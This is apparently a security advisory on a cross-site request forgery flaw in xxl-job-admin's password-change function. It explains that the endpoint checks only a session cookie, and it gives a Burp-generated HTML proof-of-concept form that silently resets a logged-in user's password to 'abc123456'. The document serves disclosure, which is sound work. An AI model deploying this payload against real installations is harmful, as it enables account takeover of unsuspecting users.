# Cross-site request forgery

In this platform, there is a password modification module. The user identity is not verified when the password is modified. You can directly modify it by entering a new password. As shown in the figure.

![image-20230131110423713](xxl-job-CSRF.assets/image-20230131110423713.png)

Check the source code and find that the identity authentication used by the system for password modification is based on the LOGIN in the request_ IDETITY_ KEY.

![image-20230131110905035](xxl-job-CSRF.assets/image-20230131110905035.png)

The poc is constructed as follows. As long as the cookie is stored locally, the password can be modified to "abc123456".

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://xx.xx.xx.xx:8080/xxl-job-admin/user/updatePwd" method="POST">
      <input type="hidden" name="password" value="abc123456" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

**Vulnerability demonstration**

Add a test1 user and log in.

![image-20230131111426358](xxl-job-CSRF.assets/image-20230131111426358.png)

Click the link to modify the password.

![image-20230131111510760](xxl-job-CSRF.assets/image-20230131111510760.png)

The password is modified successfully, and the response code is as follows:

![image-20230202153821816](xxl-job-CSRF.assets/image-20230202153821816.png)

To sum up, there is a CSRF client request forgery vulnerability in the system where the password is modified, and a poc is constructed. If the user clicks, the password can be modified.